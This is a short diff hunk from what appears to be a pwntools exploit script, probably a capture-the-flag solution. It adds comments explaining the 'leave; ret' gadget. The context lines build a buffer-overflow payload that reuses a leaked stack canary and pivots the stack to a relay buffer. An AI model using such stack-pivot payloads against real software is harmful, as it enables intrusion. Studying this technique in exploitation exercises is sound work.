@@ -46,6 +46,9 @@ payload += p64(int(stack_canary, 16))
 payload += p64(RELAY_BUFF_ADDR)
 payload += p64(rop.find_gadget(["leave", "ret"]).address)
 
+# mov rsp, rbp
+# pop rbp
+
 io.send(payload)
 io.recvuntil(b"bytes: ")
 
